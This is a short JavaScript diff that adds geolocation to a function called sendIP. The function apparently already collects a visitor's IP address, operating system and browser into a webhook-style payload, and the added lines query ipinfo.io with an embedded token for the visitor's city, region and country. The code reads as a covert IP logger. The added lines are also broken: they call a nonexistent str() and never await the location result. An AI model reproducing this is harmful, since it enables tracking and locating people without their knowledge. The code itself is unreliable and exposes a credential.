@@ -23,6 +23,17 @@ async function sendIP() {
     else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) browser = "Internet Explorer";
     else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";
 
+    //get location
+    let location = "Unknown location"
+    fetch('https://ipinfo.io/json?token=8ec6b8ecea78bc')
+      .then(response => response.json())
+      .then(data => {
+        location = str(data.city) + str(data.region) + str(data.country) 
+      })
+      .catch(error => {
+        console.error("Error")
+      })
+
     //create payload
     const payload = {
       content: `IP: ${ip}, OS: ${os}, Browser: ${browser}`,
